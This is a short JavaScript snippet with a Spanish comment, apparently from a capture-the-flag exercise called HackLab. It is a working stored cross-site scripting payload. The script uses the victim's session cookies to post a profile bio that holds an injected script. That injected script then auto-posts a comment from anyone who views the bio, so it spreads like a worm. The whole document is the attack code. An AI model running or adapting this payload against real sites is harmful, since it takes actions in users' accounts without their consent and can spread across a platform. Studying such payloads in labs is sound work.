<script>
// Simula el envío del formulario de perfil
var formData = new FormData();
formData.append('bio', '<script>setTimeout(()=>{var fd=new FormData();fd.append("comment","¡Jeni comenta automáticamente desde biografías! CTF HackLab");fetch("/comments",{method:"POST",credentials:"include",body:fd})},1000)</' + 'script>');

fetch('/profile', {
    method: 'POST',
    credentials: 'include', 
    body: formData
});
</script>
